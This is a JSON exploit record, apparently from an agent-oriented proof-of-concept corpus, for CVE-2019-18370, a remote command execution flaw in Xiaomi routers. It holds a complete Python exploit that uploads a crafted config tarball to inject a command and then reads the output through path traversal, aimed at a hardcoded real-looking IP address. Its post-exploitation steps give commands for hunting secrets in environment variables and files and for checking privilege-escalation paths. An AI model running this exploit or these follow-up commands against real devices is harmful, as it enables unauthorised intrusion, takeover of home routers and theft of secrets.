{"id": "awesome-poc:cve-2019-18370", "kind": "poc", "title": "小米 路由器 c_upload 远程命令执行漏洞 CVE-2019-18370", "technique": "rce", "summary": "网络设备漏洞 / CVE-2019-18370。载荷取自 Awesome-POC 的复现段落，已按实例值参数化。", "preconditions": ["目标产品与版本需落在 CVE-2019-18370 的影响范围内（先确认版本，再发载荷）", "载荷中的 {{host}} / {{target_url}} 按实际目标替换"], "target_stack": ["网络设备漏洞", "CVE-2019-18370"], "payload_template": "import os\nimport tarfile\nimport requests\n\n# proxies = {\"http\":\"http://{{target_url}}\"}\nproxies = {}\n\n## get stok\nstok = input(\"stok: \")\n\n## make config file\ncommand = input(\"command: \")\nspeed_test_filename = \"speedtest_urls.xml\"\nwith open(\"template.xml\",\"rt\") as f:\n    template = f.read()\ndata = template.format(command=command)\n# print(data)\nwith open(\"speedtest_urls.xml\",'wt') as f:\n    f.write(data)\n\nwith tarfile.open(\"payload.tar.gz\", \"w:gz\") as tar:\n    # tar.add(\"cfg_backup.des\")\n    # tar.add(\"cfg_backup.mbu\")\n    tar.add(\"speedtest_urls.xml\")\n\n## upload config file\nprint(\"start uploading config file ...\")\nr1 = requests.post(\"http://101.249.46.7:8098/cgi-bin/luci/;stok={}/api/misystem/c_upload\".format(stok), files={\"image\":open(\"payload.tar.gz\",'rb')}, proxies=proxies)\n# print(r1.text)\n\n## exec download speed test, exec command\nprint(\"start exec command...\")\nr2 = requests.get(\"http://101.249.46.7:8098/cgi-bin/luci/;stok={}/api/xqnetdetect/netspeed\".format(stok), proxies=proxies)\n# print(r2.text)\n\n## read result file\nr3 = requests.get(\"http://101.249.46.7:8098/api-third-party/download/extdisks../tmp/1.txt\", proxies=proxies)\nif r3.status_code == 200:\n    print(\"success, vul\")\n    print(r3.text)", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认目标版本在 CVE-2019-18370 影响范围内", "把 payload 中的占位符换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["先读进程环境再翻文件：`printenv | grep -i -e flag -e ctf -e key` —— 多数镜像把 flag 导出到 web 进程环境，这一步最快。", "环境为空就按内容搜而非名字：`grep -rIl -e 'CTF{' -e 'flag{' /var/www /srv /opt /tmp /usr/local /home 2>/dev/null` —— 文件名常是 fl4g/f1ag 或无提示名。", "仍为空就判断能否提权：`id; sudo -l; find / -perm -4000 -type f 2>/dev/null; cat /proc/version`；`/root` 常 0700、`/proc/1/environ` 常 0400，读不到就是读不到。"], "provenance": {"source_type": "reference-corpus", "source_ref": "awesome-poc", "source_url": "https://github.com/Threekiii/Awesome-POC", "notes": "提取自 网络设备漏洞/小米 路由器 c_upload 远程命令执行漏洞 CVE-2019-18370.md 的复现段落"}, "trust_level": "unverified", "verified_solve": false, "published_at": null}
